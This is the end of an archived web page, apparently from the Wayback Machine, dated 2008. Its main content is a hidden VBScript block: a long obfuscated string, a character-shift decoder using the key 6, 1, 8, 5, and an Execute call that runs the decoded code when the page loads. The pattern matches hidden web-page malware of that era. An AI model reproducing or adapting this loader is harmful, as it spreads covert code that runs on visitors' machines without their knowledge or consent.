ObhkAck])J`lc&!`ogk$=gmdAaEag_Dpo<PAKS``h>[kdEI9kjdf_Nn ObhkAck])J`lc&!n]m!!Ddn_H^@hd`?wl7CNSNg]i@onDpdmsk7)Df_H^M]snD` P=`k`OYobMYh_(8T;\md RcmH\ng!!<`mjljj[$#Gm'M>[r]#J`lcH`e`#5OBYn_'OdhOYobC]nesgk(!ObdfGlo?wannr80?m\CeCeCns=scrln<+S``hAMN&>ioqAck]QhfK[s` nsrl`g2*W^dkfnnh)cma&OYobMYh_AMN&>ioqAck]QhfK[s` r_aTAik\`l-`on!$K[s`I[l]Df_H^Df_Emi]sajhEmi]sajhCEMdl?cl $GiDjmiqM_rmh_F`rs?qj)=k]\lO_rlDn5QR[mcol)Mbjdjs>pfkf\gdCe@lqObdfHfRbdj`<bseg@fr]HfRbdj`<pak=i^AaAaHfRbdj`<pakS``hN_sAMN8Bj`[s]J\i]^n'N]qaknhfb(Eag_RqnndeJ\i]^n!!R]oVkNbddg<>ldYo_NZe_bl#VK^lhho(R``fk$=gmdMdl;ohg_NZe_bl7\j]te`hs&\jod`nr EIWbodko(;ohg_NZe_bl)mdl>FRA?!sA32-?=1*(+B>+'0)?*,9?<8%+*B(/@C-3;/:x(;ohg_NZe_bl)]q]\ndAimsYi]d $K`nOnMg]gf5;ohg_NZe_bl)AdlJ\i]^n'!@hkfdG]dd[o(r]o=KKD>'v*C,.@D(,'E(4-,),=E%333((*/9+=8(0.1*3w!!@hkfdG]dd[o(bj`[s]Dhrl\hb]##N_sAMN8@hkfdG]dd[o(F]oIab`]s $=i^AaK`n<dmjG]dd[o<AMN&?lhn`mAiq@[b`>hkfNdekHf>hkfIab`]sCe?crcO_lh)>qaq_Sqk_491<hc?crcO_lh)>qaq_Sqk_490ObdfDpdn>jl@hcD`AcmYgsCane5>hkfNdek(CjdpdD`ns]mF`rs>heIs``l@jm2!QYi^nedtd@njc<(Nn.Gobdj<lq d#5Cml#8%Qf_#(HdpoL`goKolhfb<Aiqd70OiD`h'LccrL`rs!S]hjMmh<<mb Hcc ObhkO_wl'c+)$#D`L`goFpg5+2ObdfS]hjMmh<-2@fr]D`L`goFpg5+/ObdfS]hjMmh<-3@hcD`O_lh>b`j7;cl'L`goFpg%Is``l@jmhHic/#(CeO_lh>b`j7;cl'+/#Lc_mNdek=gYm<>bq ,2(?m\CeNdekMsjdhf8S]hjRlmcm_ L`go;c[qHdpoMiFn[fMsj7@rd[pnd CahJ]t;qj#-($ObhkO_wl%n]=qDa !F_x9ml'($<%Jng]m;qj#*(!! uZ>lK^!!C`s@jm0!7 Gobdj<lq ,#!!pa;mFeJ]t;qj#,(8!!Nlc_q9ml'*$%!q\BjG`%Edq<lq .#5Is``l@jm2! %n]=qDa !Aiqd70OiD`h'=s_Rlmcm_$!q\BjG`%NdekHte79n]'Ed^'=s_Rlmcm_'c+)$#!!pa;mFeH^NdekHte7)3S``h!!pa;mFeS]hjMmh<..!!pa;mFeDf_H^%n]=qDa !O_lh>b`j7;cl'L`goFpg#Edq<lq dLg_3!$!q\BjG`%CeO_lh>b`j7;cl'*3#Lc_m uZ>lK^!!L`go;c[q8uZ>l!!pa;mFeDdn_H^Ndek=gYm<>bq -3(Obdf%n]=qDa !O_lh>b`j7n]Fe uZ>lK^!!=i^Aa!q\BjG`%NganNdpo<ObhkO_wl L`go;c[q uZ>lK^!!F`rs#!!uZ>lK^ @rd[pnd ObhkO_wl$ObhkO_wl7@rdKolhfb<!!S]hjRlmcm_ !BsegNdpo<7r[mcolf`fbo`_`7uZn]qakn= n]=qDa%^n[pgdfo(vjdnd%! 7caqrltfd5jnkdnhgi4`Znikmo_:g_el5*op6sgk4/hs5od^s`5*op6g]dagl5*op6y%dhc]s4106uancaagcsq5ga_^df8!!!4%@HKFDLH@E@7JB%Yfm`msC?H?CN<(QH<OB<(]n\`7bgh(lk)!`[ocu]S(@[ocu]%RBghjnf`hs6%6!!!'<JOD@N= 7.\dp=pa;mFe!!4%)r[mcol9pa;mFe!!4%mbjdjsg[m_p[f]8pak^lhho8!!uZ>lK^ LccrL`rs!uZ>lK^ MiFn[fMsj n]=qDa%6!!!'n]qakn= n]=qDa%6!!!'=ICQ9pa;mFe!!4%)GLHF=UZnNdpo<ObhkO_wl n]=qDa%PhKg^eRlm%q\BjG`JBZmsYmn'!OdhOYob5@RG)AdlNjd[d[k>jfc]m/! WD` AMN&Ack]@rhkom'OdhOYobv]]VEgg^dj)bsl#(ObdfEKJ(BgksEag_OdhOYobv]]VEgg^dj)bsl&VaiJ`lc%qdZWeio\fk&bceDf_H^H^EKJ(Eag_Dpdmsk#QhfK[s` nsrl`g2*W^dkfnnh)cma#(ObdfEKJ(BgksEag_OdhOYobrqnnde.,[\`mjljj-aic!$RcmH\ng!!ktms]h-1TfdvYgf-_d`!?m\Ce?m\@tf^nhgi"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 6"&vbCrLf&"KeyArr(1) = 1"&vbCrLf&"KeyArr(2) = 8"&vbCrLf&"KeyArr(3) = 5"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</BODY>
</HTML>




<!--
     FILE ARCHIVED ON 18:53:50 Jun 16, 2008 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 11:47:32 Jan 28, 2013.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
